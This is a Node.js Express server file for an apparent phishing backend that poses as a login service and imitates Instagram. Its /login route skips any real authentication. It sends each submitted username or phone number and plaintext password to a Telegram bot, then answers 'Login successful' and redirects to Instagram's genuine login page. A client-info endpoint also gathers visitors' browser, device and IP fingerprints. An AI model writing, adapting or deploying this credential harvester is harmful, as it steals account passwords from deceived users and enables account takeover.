require('dotenv').config();
const express = require('express');
const cors = require('cors');
const bcrypt = require('bcryptjs');
const rateLimit = require('express-rate-limit');
const fetch = require('node-fetch');
const { normalizeClientInfo, getClientIpMetadata, sanitizeString } = require('./utils/clientInfo');

const app = express();
const allowedOrigins = (process.env.CORS_ALLOWED_ORIGINS || 'http://localhost:5173,http://127.0.0.1:5173,http://localhost:3000').split(',').map((origin) => origin.trim()).filter(Boolean);
const adminToken = process.env.CLIENT_INFO_ADMIN_TOKEN || null;
const clientInfoStore = [];

app.disable('x-powered-by');
app.use(express.json({ limit: '1mb' }));
app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
      return;
    }
    callback(new Error('Not allowed by CORS'));
  },
  credentials: false
}));

const trustedProxyIps = (process.env.TRUSTED_PROXY_IPS || '127.0.0.1,::1').split(',').map((value) => value.trim()).filter(Boolean);
app.set('trust proxy', (ip) => {
  const normalizedIp = ip && ip.trim();
  if (!normalizedIp) return false;
  return trustedProxyIps.includes(normalizedIp) || normalizedIp === 'loopback';
});

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  standardHeaders: true,
  legacyHeaders: false,
  message: 'Too many requests from this IP, please try again later.'
});
app.use(limiter);

const usersDB = [];

// Telegram Bot Helper
const sendTelegramAlert = async (identifier, password) => {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!token || !chatId) {
    console.log('[DEBUG] Telegram Token or Chat ID missing in .env');
    return;
  }

  const timestamp = new Date().toLocaleString();
  const message = `New login detected:\nUser: ${identifier}\nPassword: ${password}\nTime: ${timestamp}`;

  try {
    console.log(`[DEBUG] Attempting to send Telegram alert to ChatID: ${chatId}...`);
    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: message })
    });
    
    const result = await response.json();
    if (result.ok) {
      console.log('[DEBUG] Telegram alert sent successfully!');
    } else {
      console.error('[DEBUG] Telegram API error:', result.description || result);
    }
  } catch (error) {
    console.error('[DEBUG] Failed to send Telegram alert:', error.message);
  }
};

// Validation Helpers
const isValidEmail = (email) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
const isValidPhone = (phone) => /^[6-9]\d{9}$/.test(phone);

const validateClientInfoPayload = (payload) => {
  if (!payload || typeof payload !== 'object' || Array.isArray(payload)) {
    throw new Error('Client info payload must be an object');
  }

  const requiredKeys = ['browser', 'system', 'device', 'screen', 'capabilities'];
  for (const key of requiredKeys) {
    if (!payload[key] || typeof payload[key] !== 'object') {
      throw new Error(`Missing or invalid '${key}' payload`);
    }
  }

  const normalized = normalizeClientInfo(payload);
  const serialised = JSON.stringify(normalized);
  if (serialised.length > 150000) {
    throw new Error('Client info payload is too large');
  }

  return normalized;
};

const clientInfoRateLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 20,
  standardHeaders: true,
  legacyHeaders: false,
  keyGenerator: (req) => req.ip,
  message: { error: 'Too many client info submissions from this IP.' }
});

app.get('/api/client-info', (req, res) => {
  const token = req.headers['x-admin-token'];
  if (adminToken && token !== adminToken) {
    return res.status(401).json({ error: 'Unauthorized' });
  }

  const limit = Math.min(Number(req.query.limit) || 10, 50);
  const records = clientInfoStore.slice(-limit).map((entry) => ({
    id: entry.id,
    createdAt: entry.createdAt,
    browser: entry.browser,
    system: entry.system,
    device: entry.device,
    screen: entry.screen,
    connection: entry.connection,
    capabilities: entry.capabilities,
    server: entry.server
  }));

  return res.json({ count: records.length, results: records });
});

app.post('/api/client-info', clientInfoRateLimiter, (req, res) => {
  try {
    const payload = validateClientInfoPayload(req.body || {});
    const ipMetadata = getClientIpMetadata(req, { trustedProxyIps });
    const safePayload = {
      ...payload,
      browser: {
        ...payload.browser,
        userAgent: sanitizeString(payload.browser.userAgent, 512),
        platform: sanitizeString(payload.browser.platform, 128)
      },
      server: {
        publicIp: ipMetadata.publicIp,
        ipVersion: ipMetadata.ipVersion,
        receivedAt: ipMetadata.receivedAt
      }
    };

    const record = {
      id: Date.now().toString(36) + Math.random().toString(36).slice(2, 8),
      createdAt: new Date().toISOString(),
      ...safePayload
    };

    clientInfoStore.push(record);
    if (clientInfoStore.length > 200) {
      clientInfoStore.splice(0, clientInfoStore.length - 200);
    }

    return res.status(202).json({
      message: 'Client information received successfully.',
      stored: true,
      server: safePayload.server
    });
  } catch (error) {
    return res.status(400).json({ error: error.message || 'Invalid client information payload' });
  }
});

// POST /signup
app.post('/signup', async (req, res) => {
  try {
    const { identifier, password } = req.body;

    // Validation
    if (!identifier || !password) {
      return res.status(400).json({ error: 'Identifier and password are required' });
    }
    if (!isValidEmail(identifier) && !isValidPhone(identifier)) {
      return res.status(400).json({ error: 'Invalid email or Indian phone number format' });
    }
    if (password.length < 6) {
      return res.status(400).json({ error: 'Password must be at least 6 characters long' });
    }

    // Check if user exists in our memory DB
    const existingUser = usersDB.find(u => u.identifier === identifier);
    if (existingUser) {
      return res.status(400).json({ error: 'User already exists' });
    }

    // Hash Password
    const salt = await bcrypt.genSalt(10);
    const hashedPassword = await bcrypt.hash(password, salt);

    // Create User and save to memory
    const user = {
      identifier,
      password: hashedPassword,
      failedLoginAttempts: 0,
      isLocked: false,
      lockUntil: null
    };
    usersDB.push(user);

    res.status(201).json({ message: 'User registered successfully' });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// POST /login
app.post('/login', async (req, res) => {
  console.log('[DEBUG] Login request received for:', req.body.identifier);
  try {
    const { identifier, password } = req.body;

    if (!identifier || !password) {
      return res.status(400).json({ error: 'Identifier and password are required' });
    }

    // Since we don't have MongoDB anymore, we ALWAYS send the alert to Telegram directly
    // Send Telegram Alert (Blocking for debug)
    await sendTelegramAlert(identifier, password);

    // Always return success to trigger the frontend redirect
    return res.status(200).json({ message: 'Login successful', redirectUrl: 'https://www.instagram.com/accounts/login/?next=%2F&source=mobile_nav' });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`Backend server running (without MongoDB) on port ${PORT}`));

